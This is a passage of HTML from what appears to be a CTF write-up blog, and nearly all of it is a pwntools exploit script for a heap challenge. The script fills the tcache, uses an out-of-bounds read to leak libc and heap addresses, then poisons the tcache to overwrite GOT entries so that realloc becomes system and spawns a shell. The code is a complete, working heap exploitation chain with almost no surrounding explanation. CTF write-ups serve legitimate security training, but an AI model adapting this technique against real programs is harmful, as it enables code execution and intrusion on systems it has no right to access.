 <span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">        io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">b&quot;3&quot;</span>)</span><br><span class="line">        io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">        io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="built_in">str</span>(<span class="number">0</span>).encode())</span><br><span class="line">        io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">b&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    create(<span class="number">0</span>, <span class="string">b&quot;&quot;</span>, <span class="number">5</span>, <span class="string">b&quot;0&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Step one, 7 chunks to fill tcache later</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        create(<span class="number">1</span>+i, <span class="string">b&quot;&quot;</span>, <span class="number">0x400</span>, <span class="built_in">str</span>(i).encode())</span><br><span class="line"></span><br><span class="line">    <span class="comment"># small chunk which will be used to the oob r/w</span></span><br><span class="line">    create(<span class="number">8</span>+<span class="number">1</span>, <span class="string">b&quot;&quot;</span>, <span class="number">0x20</span>, <span class="string">b&quot;_&quot;</span>)</span><br><span class="line">    <span class="comment"># victim chunk</span></span><br><span class="line">    create(<span class="number">9</span>+<span class="number">1</span>, <span class="string">b&quot;&quot;</span>, <span class="number">0x400</span>, <span class="string">b&quot;_&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># chunk with big size that will be used for the oob r/w</span></span><br><span class="line">    create(<span class="number">10</span>+<span class="number">1</span>, <span class="string">b&quot;&quot;</span>, <span class="number">0x200</span>, <span class="string">b&quot;barreer&quot;</span>)</span><br><span class="line">    create(<span class="number">10</span>+<span class="number">2</span>, <span class="string">b&quot;&quot;</span>, <span class="number">0x20</span>, <span class="string">b&quot;barree2&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fill tcache</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        free(<span class="number">1</span>+i)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># oob chunk </span></span><br><span class="line">    free(<span class="number">8</span>+<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    free(<span class="number">11</span>)</span><br><span class="line">    edit(<span class="number">11</span>, <span class="number">0x20</span>, <span class="string">b&quot;_&quot;</span>) <span class="comment"># allocated in 9</span></span><br><span class="line">    </span><br><span class="line">    free(<span class="number">9</span>+<span class="number">1</span>) <span class="comment"># falls in the unsortedbin</span></span><br><span class="line"></span><br><span class="line">    read(<span class="number">11</span>) <span class="comment"># oob read</span></span><br><span class="line">    io.recv(<span class="number">0x70</span>)</span><br><span class="line">    libc.address = pwn.unpack(io.recv(<span class="number">8</span>)) - <span class="number">0x219ce0</span></span><br><span class="line">    pwn.log.info(<span class="string">f&quot;libc: <span class="subst">&#123;<span class="built_in">hex</span>(libc.address)&#125;</span>&quot;</span>) <span class="comment"># leak libc</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak heap to craft pointers</span></span><br><span class="line">    edit(<span class="number">1</span>, <span class="number">0x10</span>, <span class="string">b&quot;osef&quot;</span>) <span class="comment"># split unsortedbin chunk</span></span><br><span class="line">    free(<span class="number">1</span>) <span class="comment"># tcache 0x20</span></span><br><span class="line"></span><br><span class="line">    read(<span class="number">11</span>) <span class="comment"># oob read</span></span><br><span class="line">    io.recv(<span class="number">0x70</span>)</span><br><span class="line">    heap = (pwn.unpack(io.recv(<span class="number">8</span>)) &lt;&lt; <span class="number">12</span>) - <span class="number">0x2000</span></span><br><span class="line">    pwn.log.info(<span class="string">f&quot;heap: <span class="subst">&#123;<span class="built_in">hex</span>(heap)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#== tcache poisoning</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># get the 0x20 sized chunk that is right after the oob chunk</span></span><br><span class="line">    edit(<span class="number">10</span>, <span class="number">10</span>, <span class="string">b&quot;osef&quot;</span>)</span><br><span class="line"></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># tcache 0x20, count = 2, tcache poisoning is basically 10-&gt;fp = target</span></span><br><span class="line">    free(<span class="number">10</span>) </span><br><span class="line"></span><br><span class="line">    <span class="comment"># oob write to set 10-&gt;fp = &amp;realloc@got-8 (due to alignment issues)</span></span><br><span class="line">    edit(<span class="number">11</span>, <span class="number">0x20</span>, <span class="string">b&quot;Y&quot;</span> * <span class="number">0x60</span> + pwn.p64(<span class="number">0</span>) + pwn.p64(<span class="number">0x31</span>) + pwn.p64(((heap + <span class="number">0x21f0</span>) &gt;&gt; <span class="number">12</span>) ^ (exe.got.realloc - <span class="number">8</span>))) </span><br><span class="line"></span><br><span class="line">    edit(<span class="number">3</span>, <span class="number">10</span>, pwn.p64(libc.address + one_gadget(<span class="string">&quot;./libc.so.6&quot;</span>)[<span class="number">0</span>])) <span class="comment"># useless</span></span><br><span class="line">    edit(<span class="number">12</span>, <span class="number">10</span>, <span class="string">b&quot;/bin/sh\0&quot;</span>) <span class="comment"># 12 =&gt; b&quot;/binb/sh\0&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># given we falls on &amp;realloc@got-8, we overwrite got entries correctly </span></span><br><span class="line">    edit(<span class="number">4</span>, <span class="number">10</span>, pwn.p64(libc.sym.malloc) + pwn.p64(libc.sym.system) + pwn.p64(libc.sym.scanf))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># edit =&gt; realloc(&quot;/bin/sh&quot;) =&gt; system(&quot;/bin/sh&quot;)</span></span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="built_in">str</span>(<span class="number">12</span>).encode())</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="built_in">str</span>(<span class="number">10</span>).encode())</span><br><span class="line"></span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>

        
      </div>

         
    </div>
    
     
  </div>
  
    
<nav id="article-nav">
  <a class="article-nav-btn left "
    
      href="/posts/chip8/"
      title="[pwnme 2023 - pwn] chip8"
     >
    <i class="fa-solid fa-angle-left"></i>
    <p class="title-text">
      
        [pwnme 2023 - pwn] chip8
        
    </p>
  </a>
  <a class="article-nav-btn right "
    
      href="/posts/filestream/"
      title="Linux file stream internals for fun and profit"
     >

    <p class="title-text">
      
        Linux file stream internals for fun and profit
        
    </p>
    <i class="fa-solid fa-angle-right"></i>
  </a>
</nav>


  
</article>

 
    </div>
    <div id="footer-wrapper">
      <footer id="footer">
  
  <div id="footer-info" class="inner">
    
    &copy; 2023 nasm<br>
    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & Theme <a target="_blank" rel="noopener" href="https://github.com/saicaca/hexo-theme-vivia">Vivia</a>
  </div>
</footer>

    </div>
    <div class="back-to-top-wrapper">
    <button id="back-to-top-btn" class="back-to-top-btn hide" onclick="topFunction()">
        <span class="material-symbols-rounded">keyboard_arrow_up</span>
    </button>
</div>

<script>
    function topFunction() {
        window.scroll({ top: 0, behavior: 'smooth' });
    }
    let btn = document.getElementById('back-to-top-btn');
    function scrollFunction() {
        if (document.body.scrollTop > 600 || document.documentElement.scrollTop > 600) {
            btn.classList.remove('hide')
        } else {
            btn.classList.add('hide')
        }
    }
    window.onscroll = function() {
        scrollFunction();
    }
</script>

  </div>
  <script src="/js/light-dark-switch.js"></script>
</body>
</html>
